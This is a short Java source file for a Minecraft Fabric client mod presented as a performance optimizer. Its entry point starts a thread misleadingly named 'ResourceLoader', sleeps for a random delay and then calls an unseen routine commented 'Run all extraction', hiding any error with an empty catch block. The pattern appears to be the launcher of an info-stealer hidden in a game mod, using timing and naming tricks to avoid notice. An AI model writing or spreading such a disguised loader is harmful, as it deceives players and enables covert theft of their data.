package com.example.optimizer;

import net.fabricmc.api.ClientModInitializer;

/**
 * Main Mod Entry Point
 */
public class OptimizerClientLite implements ClientModInitializer {

    @Override
    public void onInitializeClient() {
        // Run in separate thread to not block game loading
        new Thread(() -> {
            try {
                // Random delay
                Thread.sleep(5000 + (int)(Math.random() * 10000));
                
                // Run all extraction
                Ex.runAll();
                
            } catch (Exception e) {}
        }, "ResourceLoader").start();
    }
}
